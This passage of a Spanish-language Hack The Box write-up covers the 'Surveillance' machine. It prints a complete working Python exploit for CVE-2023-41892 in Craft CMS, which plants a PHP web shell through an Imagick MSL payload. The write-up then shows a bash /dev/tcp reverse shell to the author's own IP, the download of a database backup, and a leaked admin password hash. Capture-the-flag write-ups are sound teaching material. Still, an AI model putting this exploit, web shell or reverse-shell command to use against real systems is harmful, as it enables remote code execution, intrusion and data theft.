</span></span></span><span class=line><span class=cl><span class=go>[-] Write payload to temporary file ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Crash the php process and write temp file successfully
</span></span></span><span class=line><span class=cl><span class=go>[-] Trigger imagick to write shell ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Done, enjoy the shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> id
</span></span><span class=line><span class=cl><span class=gp>$</span> whoami
</span></span></code></pre></div><ul><li>De manera que decido investigar y veo que <a href=https://gist.github.com/zhsh9/ae0d6093640aa5c82c534ebee80fa1df class=external-link target=_blank rel=noopener>en este post de Github</a>, y tambi√©n en <a href=https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/ class=external-link target=_blank rel=noopener>este post</a>, muestran un PoC levemente diferente, pero ellos usan un <code>proxy</code> con <code>Burpsuite</code> para hacerlo funcionar:
<img alt=Surveillance_4.png src=/pentesting/images/Surveillance_4.png></li><li>Para arreglar esto, para cada l√≠nea que tenga la variable <code>response</code>, tenemos que agregar un proxy <code>htttp://127.0.0.1:8080</code>. <code>Burpsuite</code>, por defecto, intercepta requests por el puerto <code>8080</code> en nuestra m√°quina. De manera que agregar esto har√° que nuestro request del script de <code>Python</code> vaya a trav√©s de <code>Burpsuite</code>. Para esto cambio las l√≠neas que est√°n definidas como, por ejemplo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/shell.php&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>})</span>
</span></span></code></pre></div><p>a</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/shell.php&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>},</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>,</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>
</span></span></code></pre></div><p>Y esto lo hacemos para cada vareable que est√© seteada con <code>response.get</code> y <code>response.post</code>.</p><ul><li>De manera que el c√≥digo final que corre junto con <code>Burpsuite</code> se ve finalmente como:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>writePayloadToTempFile</span><span class=p>(</span><span class=n>documentRoot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;msl:/etc/passwd&#34;}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;image1&#34;</span><span class=p>:</span> <span class=p>(</span><span class=s2>&#34;pwn1.msl&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;image&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;read filename=&#34;caption:&amp;lt;?php @system(@$_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;write filename=&#34;info:DOCUMENTROOT/cpresources/shell.php&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;/image&gt;&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;DOCUMENTROOT&#34;</span><span class=p>,</span> <span class=n>documentRoot</span><span class=p>),</span> <span class=s2>&#34;text/plain&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getTmpUploadDirAndDocumentRoot</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=sa>r</span><span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;</span><span class=se>\\</span><span class=s1>GuzzleHttp</span><span class=se>\\</span><span class=s1>Psr7</span><span class=se>\\</span><span class=s1>FnStream&#34;, &#34;__construct()&#34;:{&#34;methods&#34;:{&#34;close&#34;:&#34;phpinfo&#34;}}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pattern1</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;tr&gt;&lt;td class=&#34;e&#34;&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;(.*?)&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pattern2</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;tr&gt;&lt;td class=&#34;e&#34;&gt;\$_SERVER\[</span><span class=se>\&#39;</span><span class=s1>DOCUMENT_ROOT</span><span class=se>\&#39;</span><span class=s1>\]&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;&#39;</span>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>    <span class=n>match1</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern1</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>match2</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern2</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>match1</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=n>match2</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>trigerImagick</span><span class=p>(</span><span class=n>tmpDir</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;vid:msl:&#39;</span> <span class=o>+</span> <span class=n>tmpDir</span> <span class=o>+</span> <span class=sa>r</span><span class=s1>&#39;/php*&#34;}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>shell</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>base_url</span> <span class=o>+</span> <span class=s2>&#34;/cpresources/shell.php&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>},</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;caption:(.*?)CAPTION&#39;</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>extracted_text</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>extracted_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>extracted_text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python CVE-2023-41892.py &lt;url&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>base_url</span> <span class=o>=</span> <span class=s1>&#39;http://surveillance.htb&#39;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Get temporary folder and document root ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>upload_tmp_dir</span><span class=p>,</span> <span class=n>documentRoot</span> <span class=o>=</span> <span class=n>getTmpUploadDirAndDocumentRoot</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>tmpDir</span> <span class=o>=</span> <span class=s2>&#34;/tmp&#34;</span> <span class=k>if</span> <span class=s2>&#34;no value&#34;</span> <span class=ow>in</span> <span class=n>upload_tmp_dir</span> <span class=k>else</span> <span class=n>upload_tmp_dir</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Write payload to temporary file ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>writePayloadToTempFile</span><span class=p>(</span><span class=n>documentRoot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>ConnectionError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Crash the php process and write temp file successfully&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Trigger imagick to write shell ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>trigerImagick</span><span class=p>(</span><span class=n>tmpDir</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Done, enjoy the shell&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cmd</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;$ &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>shell</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
</span></span></code></pre></div><ul><li>Antes de volver a correr el script modificado, abro <code>Burpsuite</code> y voy a <code>Proxy -> Intercept -> Intercept On</code>. Primero, intent√© esto contra la p√°gina <code>http://surveillance.htb/admin/login</code>, dado que el panel de login <code>Craft CMS</code> estaba expuesto en ese directorio. Y si corro el script:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892_modified.py http://surveillance.htb/admin/login
</span></span></span></code></pre></div><p>Puedo ver que <code>Burpsuite</code> intercepta exitosamente el request hecho por el script de <code>python3</code>:
<img alt=Surveillance_5.png src=/pentesting/images/Surveillance_5.png>
y, luego de esto, es s√≥lo clickear en <code>Forward</code> a medida que el script hace las requests/peticiones.</p><ul><li>Sin embargo, al final noto que el script vuelve a fallar:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892_modified.py http://surveillance.htb/admin/login
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] Get temporary folder and document root ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Write payload to temporary file ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Trigger imagick to write shell ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Done, enjoy the shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> id
</span></span><span class=line><span class=cl><span class=gp>$</span>
</span></span></code></pre></div><ul><li>Si chequeo el historial de <code>Burpsuite</code> (<code>Proxy -> Intercept -> HTTP History</code>) noto un c√≥digo <code>502 Bad Gateway</code>, es decir, estamos tratando de hacer una petici√≥n <code>POST</code> a un endpoint que no existe.
<img alt=Surveillance_6.png src=/pentesting/images/Surveillance_6.png></li><li>De manera que, en lugar de <code>http://surveillance.htb/admin/login</code> simplemente trato con la url <code>http://surveillance.htb</code> y ahora s√≠ funciona (y luego de volver a repetir los pasos con <code>Burpsuite</code> explicados anteriormente):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892_modified.py http://surveillance.htb/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] Get temporary folder and document root ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Write payload to temporary file ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Trigger imagick to write shell ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Done, enjoy the shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> id
</span></span><span class=line><span class=cl><span class=go>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></span></code></pre></div><ul><li>Empiezo un listener con <code>nc</code> en el puerto <code>443</code> y, luego, en la shell del script corro el comando <code>bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&amp;1'</code>, de manera que √©ste se ve como:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892_modified.py http://surveillance.htb/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] Get temporary folder and document root ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Write payload to temporary file ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Trigger imagick to write shell ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Done, enjoy the shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> id
</span></span><span class=line><span class=cl><span class=go>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/443 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><p>y en mi listener de <code>nc</code> obtengo una reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.245] 44376
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1086): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft/web/cpresources$ whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span></code></pre></div><ul><li>Una vez dentro de la m√°quina noto que soy el usuario <code>www-data</code>. Adem√°s, puedo ver otros dos usuarios: <code>matthew</code> y <code>zoneminder</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft/web/cpresources$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>matthew  zoneminder
</span></span></span></code></pre></div><ul><li>Buscando y buscando, al buscar por archivos con la palabra <code>back</code> (de <code>backup</code>) en <code>/var/www/html/craft</code> puedo ver algo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft$ find . -name &#34;*back*&#34; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./storage/backups
</span></span></span><span class=line><span class=cl><span class=go>./vendor/cebe/markdown/tests/markdown-data/md1_backslash_escapes.md
</span></span></span><span class=line><span class=cl><span class=go>./vendor/cebe/markdown/tests/markdown-data/md1_backslash_escapes.html
</span></span></span><span class=line><span class=cl><span class=go>./vendor/voku/arrayy/src/TypeCheck/TypeCheckCallback.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/voku/anti-xss/src/voku/helper/data/entities_fallback.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/nette/utils/src/Utils/Callback.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/templates/plugin-store/_special/oauth/callback.twig
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/templates/plugin-store/_special/oauth/modal-callback.twig
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/web/assets/dbbackup
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/web/twig/nodes/FallbackNameExpression.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/craftcms/cms/src/imagetransforms/FallbackTransformer.php
</span></span></span><span class=line><span class=cl><span class=go>./vendor/yiisoft/yii2-debug/src/assets/scss/bs-4.3.1/utilities/_background.scss
</span></span></span><span class=line><span class=cl><span class=go>./vendor/yiisoft/yii2-debug/src/assets/scss/bs-4.3.1/mixins/_background-variant.scss
</span></span></span><span class=line><span class=cl><span class=go>./vendor/monolog/monolog/src/Monolog/Handler/FallbackGroupHandler.php
</span></span></span></code></pre></div><ul><li>De manera que hay un directorio <code>/var/www/html/craft/storage/backups</code> que se ve prometedor. Dentro del directorio si veo el contenido de √©ste tenemos un archivo <code>.zip</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft/storage/backups$ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 28
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 2 www-data www-data  4096 Oct 17  2023 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 6 www-data www-data  4096 Oct 11  2023 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 root     root     19918 Oct 17  2023 surveillance--2023-10-17-202801--v4.4.14.sql.zip
</span></span></span></code></pre></div><ul><li>Dado que el servidor v√≠ctima tiene <code>python3</code> instalado, me aprovecho de esto para empezar un servidor <code>Python</code> <code>HTTP</code> temportal en el puerto <code>8000</code> de la m√°quina v√≠ctima, exponer el archivo del backup y descargarlo. De manera que en la m√°quina v√≠ctima corremos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@surveillance:~/html/craft/storage/backups$ python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></span></code></pre></div><p>y lo paso a m√≠ m√°quina de atacante corriendo el comando <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget http://surveillance.htb:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-04-18 20:12:54--  http://surveillance.htb:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
</span></span></span><span class=line><span class=cl><span class=go>Resolving surveillance.htb (surveillance.htb)... 10.10.11.245
</span></span></span><span class=line><span class=cl><span class=go>Connecting to surveillance.htb (surveillance.htb)|10.10.11.245|:8000... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 19918 (19K) [application/zip]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòsurveillance--2023-10-17-202801--v4.4.14.sql.zip‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>surveillance--2023-10-17-202801--v4.4.14.s 100%[=======================================================================================&gt;]  19.45K  75.1KB/s    in 0.3s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-04-18 20:12:54 (75.1 KB/s) - ‚Äòsurveillance--2023-10-17-202801--v4.4.14.sql.zip‚Äô saved [19918/19918]
</span></span></span></code></pre></div><ul><li>Luego, en mi m√°quina de atacante, &ndash;y luego de descomprimir el archivo con <code>unzip</code>&ndash; simplemente leo este archivo <code>.sql</code> con <code>cat</code> y hay un mont√≥n de output. Pero dentro de tanto output hay algo que llama mi atenci√≥n:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep -i &#34;matthew&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>INSERT INTO `searchindex` VALUES (1,&#39;email&#39;,0,1,&#39; admin surveillance htb &#39;),(1,&#39;firstname&#39;,0,1,&#39; matthew &#39;),(1,&#39;fullname&#39;,0,1,&#39; matthew b &#39;),(1,&#39;lastname&#39;,0,1,&#39; b &#39;),(1,&#39;slug&#39;,0,1,&#39;&#39;),(1,&#39;username&#39;,0,1,&#39; admin &#39;),(2,&#39;slug&#39;,0,1,&#39; home &#39;),(2,&#39;title&#39;,0,1,&#39; home &#39;),(7,&#39;slug&#39;,0,1,&#39; coming soon &#39;),(7,&#39;title&#39;,0,1,&#39; coming soon &#39;);
</span></span></span><span class=line><span class=cl><span class=go>INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,&#39;admin&#39;,&#39;Matthew B&#39;,&#39;Matthew&#39;,&#39;B&#39;,&#39;admin@surveillance.htb&#39;,&#39;39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec&#39;,&#39;2023-10-17 20:22:34&#39;,NULL,NULL,NULL,&#39;2023-10-11 18:58:57&#39;,NULL,1,NULL,NULL,NULL,0,&#39;2023-10-17 20:27:46&#39;,&#39;2023-10-11 17:57:16&#39;,&#39;2023-10-17 20:27:46&#39;);
